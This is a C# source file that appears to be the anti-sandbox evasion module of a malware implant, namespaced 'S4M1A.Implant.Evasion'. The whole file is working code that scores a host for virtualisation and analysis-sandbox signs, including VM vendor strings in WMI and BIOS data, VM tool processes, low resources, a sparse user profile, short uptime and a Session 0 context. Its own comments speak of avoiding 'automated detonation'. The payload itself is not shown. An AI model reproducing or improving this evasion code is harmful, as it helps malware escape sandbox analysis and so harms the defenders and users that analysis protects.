using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;

namespace S4M1A.Implant.Evasion
{
    // =====================================================================
    //  S4M1A AntiSandbox v2.0
    //  Scoring model - each hit raises the score:
    //    WMI product strings (VMware/VirtualBox/QEMU/KVM/Xen/Hyper-V)
    //    BIOS manufacturer (QEMU/Bochs/innotek/VMware)
    //    low CPU count, low RAM, low disk
    //    sandbox process names (vbox/vmware/VGAuth/qemu-ga/xenservice)
    //    low user-profile file count, low temp file count
    //    short uptime, Session 0 (services) context
    //  Flagged() returns true above a threshold (fail closed).
    // =====================================================================

    public static class AntiSandbox
    {
        private const int Threshold = 3;

        private static readonly string[] VmProcesses = new string[]
        {
            "vboxservice", "vboxtray", "vmsrvc", "vmwaretray",
            "vmwareuser", "vmtoolsd", "VGAuthService", "qemu-ga",
            "xenservice", "prl_tools", "sandboxierpcss", "docker desktop"
        };

        private static readonly string[] VmModels = new string[]
        {
            "VIRTUAL MACHINE", "VMWARE", "VIRTUALBOX", "VBOX",
            "QEMU", "KVM", "XEN", "HYPER-V", "PARALLELS", "BOCHS"
        };

        private static readonly string[] VmBios = new string[]
        {
            "QEMU", "BOCHS", "INNOTEK", "VIRTUALBOX", "VMWARE",
            "MICROSOFT CORPORATION"
        };

        private static readonly string[] VmCpu = new string[] { "QEMU", "VBOX", "VMWARE", "KVM" };

        [DllImport("user32.dll")]
        private static extern IntPtr GetProcessWindowStation();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern bool GetUserObjectInformation(
            IntPtr hObj, int nIndex, StringBuilder pvInfo,
            uint nLength, out uint lpnLengthNeeded);

        private const int UOI_NAME = 2;

        public static bool Flagged()
        {
            return Score() >= Threshold;
        }

        public static int Score()
        {
            int score = 0;
            if (VmByWmiModel()) score += 2;
            if (VmByBios()) score += 2;
            if (VmByCpu()) score += 2;
            if (LowResources()) score += 1;
            if (VmProcessesPresent()) score += 1;
            if (EmptyUserProfile()) score += 1;
            if (ShortUptime()) score += 1;
            if (IsSessionZero()) score += 1;
            return score;
        }

        private static bool VmByWmiModel()
        {
            string model = QueryScalar("SELECT Model FROM Win32_ComputerSystem", "Model");
            return ContainsAny(model, VmModels);
        }

        private static bool VmByBios()
        {
            string man = QueryScalar("SELECT Manufacturer FROM Win32_BIOS", "Manufacturer");
            string ser = QueryScalar("SELECT SerialNumber FROM Win32_BIOS", "SerialNumber");
            if (ContainsAny(man, VmBios)) return true;
            return (ser != null && (ser.Contains("VMWARE") || ser.Contains("QEMU")));
        }

        private static bool VmByCpu()
        {
            string man = QueryScalar("SELECT Manufacturer FROM Win32_Processor", "Manufacturer");
            if (ContainsAny(man, VmCpu)) return true;
            string name = QueryScalar("SELECT Name FROM Win32_Processor", "Name");
            return ContainsAny(name, VmCpu);
        }

        private static bool LowResources()
        {
            try
            {
                int cores = Environment.ProcessorCount;
                string ram = QueryScalar(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem",
                    "TotalPhysicalMemory");
                ulong ramBytes;
                ulong.TryParse(ram, out ramBytes);
                bool low = cores < 2 || ramBytes < (ulong)(3UL * 1024 * 1024 * 1024);

                string disk = QueryScalar(
                    "SELECT Size FROM Win32_LogicalDisk WHERE DriveType=3", "Size");
                ulong diskBytes;
                ulong.TryParse(disk, out diskBytes);
                if (diskBytes > 0 && diskBytes < (ulong)(60UL * 1024 * 1024 * 1024))
                    low = true;
                return low;
            }
            catch { return false; }
        }

        private static bool VmProcessesPresent()
        {
            foreach (string name in VmProcesses)
            {
                try
                {
                    if (Process.GetProcessesByName(name).Length > 0) return true;
                }
                catch { }
            }
            return false;
        }

        private static bool EmptyUserProfile()
        {
            try
            {
                string user = Environment.GetFolderPath(
                    Environment.SpecialFolder.UserProfile);
                if (!Directory.Exists(user)) return true;
                int files = Directory.GetFiles(user, "*", SearchOption.TopDirectoryOnly).Length;
                if (files < 10) return true; // freshly provisioned box

                string temp = Path.GetTempPath();
                int tmpFiles = Directory.GetFiles(temp, "*", SearchOption.TopDirectoryOnly).Length;
                return tmpFiles < 20;
            }
            catch { return false; }
        }

        private static bool ShortUptime()
        {
            // under 10 minutes uptime = likely an automated detonation
            return Environment.TickCount < 10 * 60 * 1000;
        }

        private static bool IsSessionZero()
        {
            try
            {
                IntPtr ws = GetProcessWindowStation();
                if (ws == IntPtr.Zero) return false;
                uint len;
                GetUserObjectInformation(ws, UOI_NAME, null, 0, out len);
                if (len <= 0) return false;
                StringBuilder sb = new StringBuilder((int)len);
                if (!GetUserObjectInformation(ws, UOI_NAME, sb, len, out len))
                    return false;
                return sb.ToString().StartsWith("Service-0x0-");
            }
            catch { return false; }
        }

        // ------------------------- WMI helper -------------------------

        private static string QueryScalar(string query, string field)
        {
            try
            {
                using (ManagementObjectSearcher searcher =
                    new ManagementObjectSearcher("root\\CIMV2", query))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        try
                        {
                            object v = mo[field];
                            if (v != null) return v.ToString();
                        }
                        catch { }
                    }
                }
            }
            catch { }
            return null;
        }

        private static bool ContainsAny(string value, string[] needles)
        {
            if (string.IsNullOrEmpty(value)) return false;
            string u = value.ToUpperInvariant();
            foreach (string n in needles)
                if (u.Contains(n)) return true;
            return false;
        }
    }
}